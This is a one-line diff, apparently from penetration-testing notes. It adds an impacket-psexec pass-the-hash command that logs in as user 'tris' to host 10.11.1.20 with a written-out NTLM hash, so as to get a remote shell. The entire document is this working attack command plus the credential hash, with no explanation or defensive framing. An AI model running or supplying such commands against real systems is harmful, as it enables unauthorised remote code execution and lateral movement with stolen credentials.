@@ -1,0 +1,1 @@
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:08df3c73ded940e1f2bcf5eea4b8dbf6 tris@10.11.1.20
